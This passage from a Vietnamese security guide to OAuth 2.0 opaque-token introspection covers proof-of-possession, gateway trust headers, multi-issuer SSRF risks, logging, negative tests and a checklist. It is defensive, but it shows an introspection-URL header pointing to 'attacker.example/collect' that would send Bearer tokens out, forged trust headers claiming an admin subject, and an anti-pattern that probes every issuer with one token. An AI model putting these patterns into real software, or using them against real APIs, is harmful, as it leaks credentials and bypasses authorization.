Không khẳng định opaque luôn bị revoke tức thì hay JWT không thể revoke; cả hai phụ thuộc kiến trúc.

### Rights changed after token issued

Ngay cả khi AS trả active=true, quyền đọc một Order có thể đã bị thu hồi ở permission store của Orders. RS có thể cần **policy lookup tại request** cho dữ liệu nhạy cảm; metadata scope/role là snapshot theo grant và không thay resource authorization.

## 21. Sender-constrained opaque token: còn phải kiểm proof

Một access token có thể được ràng với **DPoP key** hoặc **mTLS client certificate** theo profile.

Ví dụ metadata mở rộng chứa confirmation:

~~~json
{
  "active": true,
  "aud": "https://payments.example.test/api",
  "scope": "payments:reconcile",
  "cnf": {
    "jkt": "EXAMPLE_DPOP_KEY_THUMBPRINT"
  }
}
~~~

Giá trị là minh họa; representation cụ thể phải theo AS/RS/profile.

**Bản thân cnf không chứng minh caller hiện tại có khóa.** RS phải xác minh proof đi kèm **request này**:

- Với **DPoP (RFC 9449)**: kiểm chữ ký proof, method, URI, thời gian, jti/replay, nonce khi yêu cầu, và key thumbprint gắn token.
- Với **mTLS certificate-bound AT (RFC 8705)**: kiểm client certificate của TLS channel và binding thumbprint/token theo profile.
- Với **Bearer token** không sender binding: một bản sao có thể được dùng tại audience đúng trong thời hạn token còn hợp lệ.

**Introspection trả active=true không thay proof-of-possession.** Audience restriction cũng không thay sender proof; cả hai bảo vệ các khía cạnh khác nhau.

### Browser/client runtime bị chiếm

Ngay cả khi khóa không xuất được, mã độc chạy trong client runtime có thể yêu cầu ứng dụng ký/gửi request. Sender-constraining làm giảm token replay từ bên ngoài, không thay phòng XSS, giới hạn quyền và audit.

## 22. Introspection ở API Gateway và service mesh

~~~mermaid
flowchart LR
    C["OAuth Client"] -->|"Opaque Bearer token"| G["API Gateway"]
    G -->|"POST /introspect"| AS["Authorization Server"]
    G -->|"Trusted verified context"| O["Orders Service"]
    G -->|"Route khác"| P["Payments Service"]
    O --> D[("Orders DB")]
~~~

Có hai mô hình:

**A. Mỗi Resource Server introspect riêng.** Mỗi API kiểm audience/scope/permission của chính nó. Ưu điểm là trust boundary độc lập; nhược điểm là cần phân phối cấu hình và network calls.

**B. Gateway introspect và truyền context tin cậy.** Chỉ an toàn khi:

1. Gateway không bị bypass bởi Internet/client chưa tin.
2. Headers từ bên ngoài được xóa hoặc ghi đè trước khi chuyển nội bộ.
3. Hop Gateway→Backend được xác thực/bảo vệ bằng mTLS hoặc một phương thức tương đương.
4. Gateway kiểm **token audience phù hợp logical resource/backend**.
5. Backend vẫn áp permission theo tenant và resource.

Một client có thể tự gửi:

~~~http
X-Token-Active: true
X-Token-Scope: orders:approve
X-Token-Audience: orders-api
X-Authenticated-Subject: admin
~~~

**Không được tin những headers đó nếu chúng không xuất phát từ thành phần xác thực đáng tin**. Dù mTLS bảo vệ hop nội bộ, nó không tự sửa token sai audience ở ingress.

### Gateway có thể là logical Resource Server

Nếu nhiều backend được tổ chức thành một logical RS, audience có thể thuộc gateway/resource identifier thống nhất theo hợp đồng. Nếu mỗi backend có audience riêng, gateway phải phân biệt route/recipient. **Không suy expected audience từ Host do browser gửi hoặc tên service được ghép chuỗi tùy tiện**.

## 23. Multi-issuer, metadata discovery và SSRF

Một Orders API có thể phải hỗ trợ nhiều issuer, nhưng opaque token không nhất thiết tự công bố issuer ở dạng RS được tin tưởng.

Một cách sai:

~~~text
for every configuredAuthorizationServer:
    POST incomingToken to its introspectionEndpoint
    if active=true:
        accept token
~~~

Cách này làm **rò rỉ credential** sang AS không phải issuer và có thể vi phạm trust boundary.

Phương án an toàn hơn:

- Xác định expected issuer từ **client registration/trust context** hoặc một cơ chế token routing được thiết kế/kiểm soát.
- Không dùng token prefix tùy ý hoặc header do client gửi làm nguồn tin cậy nếu attacker có thể điều khiển.
- Lấy introspection endpoint từ **metadata của issuer đã được cấu hình tin cậy**, không từ token.
- Tách API/trust domains nếu không thể quyết định issuer an toàn.
- Dùng credential introspection riêng cho từng issuer/RS.
- Giới hạn điều kiện tiếp nhận token theo issuer, audience, token profile và client allowlist.

### SSRF + credential exfiltration

Đặc biệt không xây:

~~~text
POST /api/orders
Authorization: Bearer T
X-Introspection-Url: https://attacker.example/collect

RS -> POST token T đến header URI do attacker chỉ định
~~~

URI introspection do client chỉ định có thể vừa tạo **SSRF**, vừa gửi raw Bearer token tới host của attacker. Mọi AS endpoint phải được chọn từ registry/configuration đáng tin.

## 24. Error handling và observability

Các sự kiện vận hành nên tách rõ:

~~~text
INTROSPECTION_ACTIVE
INTROSPECTION_INACTIVE
INTROSPECTION_AUDIENCE_MISMATCH
INTROSPECTION_SCOPE_DENIED
INTROSPECTION_BAD_RS_CREDENTIAL
INTROSPECTION_HTTP_5XX
INTROSPECTION_TIMEOUT
INTROSPECTION_TLS_FAILURE
INTROSPECTION_SCHEMA_INVALID
INTROSPECTION_CACHE_HIT
INTROSPECTION_REVOKE_LAG
INTROSPECTION_SENDER_PROOF_INVALID
~~~

Đây là ví dụ tên metric/event, không phải thuật ngữ bắt buộc của RFC.

### Điều nên quan sát

- p50/p95/p99 latency của AS introspection.
- Tỷ lệ active=false, aud/scope mismatch.
- HTTP 401/403 của RS credentials với AS.
- Timeouts, 5xx, TLS/certificate failures.
- Cache hit rate, cache age, token expiry gần đến.
- Khoảng trễ revocation giữa AS và RS.
- Quy mô introspection calls theo từng RS để phát hiện abuse.

### Đừng log raw token hoặc PII không cần thiết

Ẩn hoặc redact:

- Header **Authorization: Bearer** từ client.
- Form body **token** gửi AS.
- Introspection secret/private key.
- Full introspection response chứa sub, username hoặc metadata cá nhân.
- Query parameters hoặc tracing baggage chứa access token.

Nếu cần ghép sự kiện, dùng random request correlation ID hoặc **HMAC token fingerprint** có khóa/retention phù hợp; không đưa token nguyên văn vào logs hoặc metric labels.

### Retry có giới hạn, tuyệt đối không fail-open

Timeout có thể được xử lý bằng bounded retry/backoff/circuit breaker theo SLO. Nhưng **không bypass token validation khi AS chậm**. Nếu có cache còn hạn theo policy, hành vi khi AS outage phải được định nghĩa trước và tuân SLA rủi ro; không tái sử dụng entry quá hạn vô thời hạn.

## 25. Tình huống thực tế: Orders token gửi nhầm Payments API

AS phát opaque token T cho reporting-worker:

~~~text
token = opaque-T
client_id = reporting-worker
aud = https://orders.example.test/api
scope = orders:read
active = true
~~~

### Bước 1 — Dùng tại Orders API

Orders introspect T, nhận active=true với aud=Orders. Nó kiểm scope orders:read và quyền tenant/bản ghi. Nếu đạt, có thể trả dữ liệu.

### Bước 2 — Token T bị chuyển sang Payments

Client hoặc một service cấu hình sai gửi T tới Payments:

~~~http
POST /api/payments/reconcile HTTP/1.1
Host: payments.example.test
Authorization: Bearer EXAMPLE_OPAQUE_T
~~~

Payments introspect, AS vẫn có thể trả **active=true** vì T chưa bị revoke. Nếu Payments chỉ kiểm active, đây là **lỗ hổng token substitution xuyên API**.

**Hành vi đúng:** Payments từ chối do **aud=Orders**, đồng thời scope không phù hợp Payments.

### Bước 3 — T bị revoke

AS revoke T nhưng Orders còn cache active=true trong giới hạn TTL. Hệ thống cần SLA để phản ánh revoke; không mô tả cache active là bảo đảm chính sách hiện tại.

### Bước 4 — AS outage

AS trả 503 hoặc timeout. Nếu không có cache hợp lệ theo policy, Orders/Payments không thể xác minh T nên **không thực hiện request**. Nên trả lỗi vận hành phù hợp, không coi T hợp lệ.

### Bước 5 — Phát hiện lỗi qua audit

Metrics cho thấy nhiều **AUDIENCE_MISMATCH** ở Payments. Đội vận hành rà soát token forwarding, gateway trust headers và cache key, thay vì **tắt kiểm audience** để request qua.

## 26. Negative tests cho introspection endpoint

| Ca kiểm thử | Thiết lập | Kết quả mong đợi |
| --- | --- | --- |
| **Active đúng** | Opaque AT Orders còn hạn, aud/scope đúng. | RS kiểm tiếp quyền nghiệp vụ. |
| **Token không tồn tại** | Gửi token ngẫu nhiên. | AS trả active=false, RS từ chối. |
| **Token bị revoke** | Token đã bị thu hồi. | active=false sau cập nhật trạng thái theo policy. |
| **Token hết hạn** | exp đã qua. | RS từ chối. |
| **Token trước nbf** | Không thỏa thời điểm bắt đầu. | RS từ chối. |
| **Token bị sửa** | Thay một ký tự opaque token. | Không xác minh được. |
| **Thiếu token field** | Form POST không có token. | AS từ chối request không hợp lệ. |
| **Hai token fields** | Form có hai token values. | Strict parser từ chối mơ hồ. |
| **token_type_hint giả** | Hint access_token cho credential khác loại. | AS không tin hint làm bằng chứng. |
| **RS credential sai** | Secret/certificate không hợp lệ. | AS từ chối introspection caller. |
| **RS không được xem token** | Payments RS hỏi token dành riêng Orders. | AS hạn chế/ẩn metadata, không lộ PII. |
| **active=false** | AS trả inactive. | RS không tạo principal. |
| **active là string** | Response có active="true". | RS từ chối schema. |
| **active thiếu** | Response không có field active. | RS fail closed. |
| **Response malformed** | JSON lỗi cú pháp hoặc quá lớn. | RS không chấp nhận. |
| **aud sai** | AT Orders gửi Payments. | Payments từ chối. |
| **aud prefix** | aud=orders-api-backup cho Orders. | Từ chối so khớp gần giống. |
| **aud thiếu** | Profile RS yêu cầu aud nhưng response thiếu. | RS từ chối. |
| **multi-aud ngoài policy** | Token nhiều recipients khi policy single-aud. | RS từ chối. |
| **Scope thiếu** | AT chỉ orders:read, endpoint yêu cầu orders:approve. | RS từ chối authorization. |
| **Service token tại user endpoint** | Client credentials AT gọi endpoint user-only. | RS từ chối principal type. |
| **Refresh token làm AT** | AS nhận diện RT active. | RS không nhận thay access token. |
| **ID token làm AT** | OIDC ID token đưa vào API. | RS từ chối type/aud. |
| **Wrong issuer** | Metadata issuer không được tin. | RS từ chối. |
| **HTTP 401 introspection** | Caller RS auth thất bại. | Fail closed, cảnh báo cấu hình. |
| **HTTP 503 introspection** | AS unavailable. | Không allow mặc định. |
| **Timeout/TLS lỗi** | Không xác minh được AS. | Fail closed. |
| **Cache quá exp** | Cached true nhưng token đã hết hạn. | RS từ chối. |
| **Cache sau revoke** | Revoke trong cache TTL. | Hành vi đúng SLA revocation, có đo lag. |
| **Cache nhầm RS** | Payments dùng cached metadata của Orders. | Không vượt qua audience. |
| **Concurrent calls** | Nhiều request cùng token. | Single-flight/cache không lẫn context. |
| **Cross-tenant** | Token đúng aud/scope, order tenant không được phép. | RS từ chối. |
| **Sender proof sai** | DPoP/mTLS proof không đúng binding. | RS từ chối. |
| **Endpoint do client chọn** | Client gửi introspection URL ngoài allowlist. | RS không gửi token ra ngoài. |
| **Multi-AS probing** | RS gửi cùng token đến mọi AS. | Kiến trúc/test chặn disclosure sai. |
| **Gateway header giả** | Client tự gửi X-Token-Active=true. | Không ảnh hưởng kết quả xác minh. |

### Bộ test tối thiểu qua hai API

~~~text
OpaqueOrders:
    active=true
    aud=orders-api
    scope=orders:read

A. Orders + GET /orders        -> check business authorization
B. Payments + opaqueOrders    -> DENY by audience
C. Orders + POST /approve     -> DENY by scope
D. Orders + revoked token     -> DENY after allowed cache window
E. Orders + introspection 503 -> FAIL CLOSED
~~~

**check business authorization** không đồng nghĩa chắc chắn HTTP 200; còn quyền tenant và trạng thái Order.

## 27. Checklist triển khai và vận hành

1. **Token profile:** RS chỉ nhận opaque access token đúng contract, không nhận RT/ID token thay AT?
2. **Trusted endpoint:** Introspection URI từ issuer metadata/configuration được tin cậy, không từ client?
3. **HTTPS/TLS:** Kết nối RS–AS được bảo vệ, xác minh certificate/hostname, không downgrade?
4. **RS authentication:** AS xác thực caller và giới hạn RS nào được truy vấn token?
5. **Disclosure policy:** AS chỉ trả metadata cần thiết; inactive token không lộ thông tin riêng?
6. **Request:** POST form, một trường token, token_type_hint chỉ dùng làm hint?
7. **No URL tokens:** Không đưa raw token vào query string hoặc logs?
8. **Response schema:** RS yêu cầu active là boolean và xử lý malformed response fail closed?
9. **Active=false:** Không tạo principal, không thực hiện API action?
10. **Token type:** RS chỉ chấp nhận access token đúng profile/transport?
11. **Issuer:** RS kiểm đúng AS tin cậy; không dò nhiều AS bằng cùng Bearer token?
12. **Audience:** RS kiểm exact identifier của mình hoặc cơ chế recipient binding được đánh giá?
13. **Scope:** RS parse exact scope và kiểm theo endpoint/method?
14. **Principal:** RS phân biệt End-User và service principal của client_credentials?
15. **Tenant:** RS kiểm quyền theo tài nguyên thực, không chỉ tin header/path?
16. **Time:** RS kiểm exp/nbf theo policy và không giữ cache quá token expiry?
17. **Revocation:** Cache TTL/invalidation đáp ứng SLA an toàn, kể cả khi client bị khóa?
18. **AS outage:** 401 caller auth, 5xx, timeout, TLS error không tạo đường bypass?
19. **Cache key:** Có token identity, issuer, RS caller/disclosure context, chính sách eviction?
20. **Rate limiting:** Có giới hạn introspection tải lớn và token enumeration?
21. **Sender binding:** Nếu DPoP/mTLS, có kiểm proof từ request hiện tại với token binding?
22. **Gateway:** Không tin headers do client giả và không cho bypass introspection?
23. **SSRF:** Không dùng URI AS/introspection do client chỉ định?
24. **Observability:** Có metrics inactive/mismatch/latency/cache/revoke lag mà không log token?
25. **Negative tests:** Bao phủ inactive, bad caller, sai type/aud/scope, AS outage, cache, tenant, sender proof?

## Kết luận

**Introspection endpoint cho opaque token** là giao thức để Resource Server được ủy quyền hỏi Authorization Server về **trạng thái và metadata** của một token mà RS không thể tự giải mã đáng tin. Theo **RFC 7662**, RS gửi token qua **POST với TLS và caller authentication**, nhận JSON có **active** cùng những thông tin tùy chọn được AS cho phép tiết lộ.

**Điểm mấu chốt: active=true chưa phải authorization.** Resource Server vẫn phải kiểm **token type, issuer, audience, thời hạn, scope, principal, sender proof (nếu áp dụng) và quyền trên tài nguyên/tenant**. Token inactive, metadata sai hoặc không xác minh được vì lỗi AS đều phải **không được cho qua**.

Introspection giúp quản lý trạng thái tập trung và hỗ trợ thu hồi token, nhưng **cache, độ trễ mạng, khả năng sẵn sàng của AS, bảo mật introspection credentials và phân quyền metadata** là các phần quan trọng của thiết kế. Một triển khai tốt không chỉ có endpoint trả active mà còn có **trust boundary rõ, fail-closed behavior, kiểm thử âm tính và SLA revocation có thể đo được**.

### Tài liệu tham khảo

- [RFC 7662 — OAuth 2.0 Token Introspection](https://www.rfc-editor.org/rfc/rfc7662)
- [RFC 7662 — Section 2.1: Introspection Request](https://www.rfc-editor.org/rfc/rfc7662#section-2.1)
- [RFC 7662 — Section 2.2: Introspection Response](https://www.rfc-editor.org/rfc/rfc7662#section-2.2)
- [RFC 7662 — Section 4: Security Considerations](https://www.rfc-editor.org/rfc/rfc7662#section-4)
- [RFC 6749 — The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749)
- [RFC 6750 — OAuth 2.0 Bearer Token Usage](https://www.rfc-editor.org/rfc/rfc6750)
- [RFC 7009 — OAuth 2.0 Token Revocation](https://www.rfc-editor.org/rfc/rfc7009)
- [RFC 7519 — JSON Web Token](https://www.rfc-editor.org/rfc/rfc7519)
- [RFC 8414 — OAuth 2.0 Authorization Server Metadata](https://www.rfc-editor.org/rfc/rfc8414)
- [RFC 8693 — OAuth 2.0 Token Exchange](https://www.rfc-editor.org/rfc/rfc8693)
- [RFC 8705 — Mutual-TLS Client Authentication and Certificate-Bound Access Tokens](https://www.rfc-editor.org/rfc/rfc8705)
- [RFC 8707 — Resource Indicators for OAuth 2.0](https://www.rfc-editor.org/rfc/rfc8707)
- [RFC 8725 — JSON Web Token Best Current Practices](https://www.rfc-editor.org/rfc/rfc8725)
- [RFC 9068 — JWT Profile for OAuth 2.0 Access Tokens](https://www.rfc-editor.org/rfc/rfc9068)
- [RFC 9449 — Demonstrating Proof of Possession (DPoP)](https://www.rfc-editor.org/rfc/rfc9449)
- [RFC 9700 — Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700)
- [OWASP OAuth 2.0 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html)



